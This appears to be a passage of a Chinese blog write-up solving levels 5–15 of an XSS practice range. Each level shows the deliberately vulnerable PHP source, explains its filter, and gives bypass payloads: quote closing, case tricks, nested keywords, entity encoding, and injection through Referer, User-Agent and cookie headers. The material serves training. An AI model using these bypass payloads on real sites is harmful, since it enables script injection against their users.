+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level6.php?keyword=柳暗花明&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第5关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第5关 没错又是搜索&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/cb30e912-eabc-4357-89eb-49e8de1b1961.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h3><p>strtolower()函数，把字符转换为小写，接着替换script标签和on使这个两个事件没法使用，但仍可以闭合引号，所以要使用其他标签通过javascript:alert(‘xss’)来触发弹出<br><img src="https://Lmg66.github.io/img/131.png" alt="图片"><br><img src="https://Lmg66.github.io/img/132.png" alt="图片"></p>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) &quot;
+&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) //</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><h3 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level7.php?keyword=持之以恒&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第6关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第6关 嗯 还是搜索&lt;/h1&gt;
+&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/92847238-8dda-473f-9c04-83986de1472a.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h3><p>替换了script标签,on,src,data,herf,且html实体化看起来似乎没问题，但相比前几关发现没有转换为小写，所以可大小写来绕过匹配</p>
+<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; ONclick=alert(&#39;XSS&#39;) //
+&quot;&gt;&lt;a Href=javascript:alert(&#39;XSS&#39;) //</code></pre><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><h3 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level8.php?keyword=笨鸟先飞&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第7关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第7关 猜一猜下面题目还有搜索嘛&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/17532328-f4cc-4bca-b283-c7f7b5a13f80.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h3><p>get方式传入keyword，strtolowe()函数变为小写，然后replace()函数匹配script，on，src，data，href，但是只是匹配了一次，所以可以嵌套绕过，最后htmlspecialchars(),所以&lt; &gt; 不能用，尝试闭合”</p>
+<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; oonnclick=alert(&#39;XSS&#39;) //</code></pre><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><h3 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level9.php?keyword=水滴石穿&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第8关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第8关 老铁要和我换友链嘛？&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);
+echo &#39;&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;?php
+ echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/d2d2080f-746c-4276-9f63-585fc4fd4a9c.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h3><p>get方式传入keyword，strtolower()转换为小写，然后replace替换script，on，src，data，href，”（”号html实体化了）,然后发现又html实体化输入，似乎没有问题，然后发现友情链接,没有html实体化输入，可以尝试在这个位置绕过，但是都被过滤了，尝试编码绕过对JavaScript;alert(‘xss’)编码(呸，不是编码)转义<a href="https://www.jianshu.com/p/6dcefb2a59b2(参考链接)，目的是绕过replace，然后仍能被html解析" target="_blank" rel="noopener">https://www.jianshu.com/p/6dcefb2a59b2(参考链接)，目的是绕过replace，然后仍能被html解析</a><br><img src="https://Lmg66.github.io/img/133.png" alt="图片"></p>
+<h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;)
+javascrip&amp;#x09t:alert(&#39;XSS&#39;)</code></pre><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><h3 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level10.php?keyword=持之以恒&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第9关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第9关 添加友连again&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);
+echo &#39;&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;?php
+if(false===strpos($str7,&#39;http://&#39;))
+{
+  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+        }
+else
+{
+  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+}
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/51fb4236-2965-42ab-851e-0ec266b3c3ba.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h3><p>和第八关相同，只是判断链接是否合法，加上http://就可以了</p>
+<h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;) //http://</code></pre><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><h3 id="查看源码-9"><a href="#查看源码-9" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level11.php?keyword=自强不息&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第10关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第10关 嗯 搜索又出现了&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/fed9cb1c-3111-49a8-b111-16081ac4b16c.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h3><p>传入keyword和t_sort,keyword没有过滤，但是html实体化输出，而且没在标签内，所以应该没问题，看t_sort，过滤了&lt; &gt; ,而且没有实体化输出<br>尝试闭合引号</p>
+<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h3><p><code>?keyword=123&amp;t_sort=&quot; type=&quot;text&quot; onclick=alert(&#39;XSS&#39;) //</code></p>
+<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><h3 id="查看源码-10"><a href="#查看源码-10" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level12.php?keyword=破釜沉舟&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第11关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第11关 为什么这么多搜索呢&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER[&#39;HTTP_REFERER&#39;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/60a6e17f-c823-40c3-ab84-502b2f905456.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h3><p>str和str00都html实体化而且不在script标签内部，且闭合为’,应该无解，然后发现str33，没有实体化，$_SERVER[‘HTTP_REFERER’]获取httpreferer信息，只是过滤了&lt; &gt; ,可以闭合双引号来绕过,不过我没明白这题啥用</p>
+<h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/134.png" alt="图片"></p>
+<h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><h3 id="查看源码-11"><a href="#查看源码-11" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level13.php?keyword=矢志不渝&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第12关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第12关 黑人问号&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/f4558b8c-778b-4dd8-bef6-425766f9d178.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析:"></a>分析:</h3><p>和上一关一样，xss位置变一下</p>
+<h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/135.png" alt="图片"></p>
+<h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><h3 id="查看源码-12"><a href="#查看源码-12" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level14.php&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第13关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第13关 做题好爽啊&lt;/h1&gt;
+&lt;?php 
+setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_COOKIE[&quot;user&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#39;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/c048c2e3-7937-478b-9781-0ee4d7214648.jpg&quot;&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析:"></a>分析:</h3><p>$_COOKIE[“user”];获取cookie，然后过滤&lt; &gt; 没有实体化输入，尝试闭合双引号</p>
+<h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h3><pre><code>user=&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/136.png" alt="图片"></p>
+<h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><h3 id="查看源码-13"><a href="#查看源码-13" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script src=&quot;https://chao.jsanhuan.cn/angular.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;哎哟 不错哦！&quot;);
+ window.location.href=&quot;level15.php?keyword=业精于勤&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第14关&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1 align=center&gt;第14关 恭喜你快要通关了&lt;/h1&gt;
+&lt;p align=center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/54c95d0f-037b-4885-a3f4-f8a3ad5c9341.jpg&quot; width=&quot;20%&quot;&gt;&lt;/p&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;src&quot;];
+echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;
+?&gt;</code></pre><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析:"></a>分析:</h3><p>传入src，然后实体化输出，然后似乎无解，仔细看前面ng-include:,<br>ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以传入其他关的xss，不过不知道这有啥用既然其他地点有xss<br><img src="https://Lmg66.github.io/img/137.png" alt="图片"></p>
+<h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h3><pre><code>src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre><p>由于引用的js代码失败，所以我没成功，但云靶机是对的，云靶机地址：<a href="https://www.xss.tv/" target="_blank" rel="noopener">https://www.xss.tv/</a><br><img src="https://Lmg66.github.io/img/138.png" alt="图片"></p>
+<h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><h3 id="查看源码-14"><a href="#查看源码-14" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;ORZ ORZ ORZ 恭喜全部通过&quot;);
+ window.location.href=&quot;success.txt&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;第15关&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;第15关 厉害了 Word哥&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
+$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
+$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
+$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);
+echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/9ec67d16-a8b9-41cd-82fa-14b0c0f96e72.gif&quot;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析:"></a>分析:</h3><p>get传入可以word，转换为小写，让过滤script，空格，/，可以使用url编码来绕过<br>| 符号 |url编码 |<br>| ——– | —— |<br>| 回车     | %0d |<br>| 换行     | %0d |<br>payload:</p>
+<pre><code>level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&#39;XSS&#39;)&gt;</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>国光大佬:<a href="https://www.sqlsec.com/2020/01/xss.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/01/xss.html</a><br>最后欢迎访问我的博客:<a href="https://lmg66.github.io/">https://lmg66.github.io/</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Lmg66.github.io" rel="external nofollow noreferrer">Lmg</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Lmg66.github.io/posts/996d.html">https://Lmg66.github.io/posts/996d.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://Lmg66.github.io" target="_blank">Lmg</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/xss/">
+                                    <span class="chip bg-color">xss</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
